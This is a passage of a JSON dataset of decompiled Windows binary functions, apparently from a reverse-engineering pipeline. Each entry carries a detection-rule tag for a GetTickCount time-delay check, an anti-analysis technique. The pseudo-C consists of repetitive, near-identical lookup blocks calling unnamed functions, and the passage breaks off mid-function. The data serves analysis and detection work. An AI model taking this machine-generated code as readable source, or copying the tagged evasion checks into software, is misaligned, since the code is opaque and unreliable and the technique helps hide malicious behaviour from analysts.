piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113590, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401135b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113640, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113660, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113680, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 3999
    },
    "1400b973": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b9730(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(0x140108470);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401127f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108480);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140112810, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff30);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113240, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff40);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113280, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113320, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113340, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108920);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113360, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108930);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113380, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108940);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108950);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133c0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113400, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113450, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113490, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113510, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113550, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113590, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401135b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113640, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113660, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113680, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 3845
    },
    "1400b979": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b9790(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(0x140108480);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140112810, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff30);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113240, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff40);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113280, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113320, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113340, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108920);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113360, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108930);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113380, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108940);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133a0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108950);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133c0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108960);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133e0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108970);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113400, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113450, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113490, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113510, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113550, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113590, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401135b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113640, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113660, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113680, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 3692
    },
    "1400b97f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b97f0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(*0x14010ff30);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113240, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff40);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113280, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113320, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113340, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108920);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113360, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108930);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113380, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108940);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108950);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133c0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113400, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113450, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < 